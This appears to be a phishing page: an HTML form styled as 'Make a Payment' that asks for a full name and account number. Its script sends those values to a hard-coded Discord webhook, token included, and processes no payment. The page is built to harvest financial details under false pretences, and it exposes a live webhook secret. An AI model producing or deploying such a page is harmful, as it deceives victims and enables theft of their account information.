<body class="container"><h1>Make a Payment</h1>

    <form onsubmit="sendContact(event)">
        <div class="mb-3">
            <label for="emailInput" class="form-label">Full Name on file</label>
            <input type="name" class="form-control" id="emailInput">
        </div>
        <div class="mb-3">
            <label for="messageInput" class="form-label">Account Number</label>
            <textarea class="form-control" id="messageInput" rows="1"></textarea>
        </div>
        <button type="submit" class="btn btn-primary">Pay</button>
    </form>

    <script>
        async function sendContact(ev) {
            ev.preventDefault();
            const senderEmail = document
                .getElementById('emailInput').value;
            const senderMessage = document
                .getElementById('messageInput').value;
            const webhookBody = {
                embeds: [{
                    title: 'Contact Form Submitted',
                    fields: [{
                            name: 'Sender',
                            value: senderEmail
                        },
                        {
                            name: 'Message',
                            value: senderMessage
                        }
                    ]
                }],
            };
            const webhookUrl = 'https://canary.discord.com/api/webhooks/1193022395724869744/d66HB0vAruPVsikVCxh5B_WCdRV1fWBdW-yt0UvQZ8kNpe518Ttg4yA7nbK-yWgSw-7Z';
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(webhookBody),
            });
            if (response.ok) {
                alert('I have received your message!');
            } else {
                alert('There was an error! Try again later!');
            }
        }
    </script>
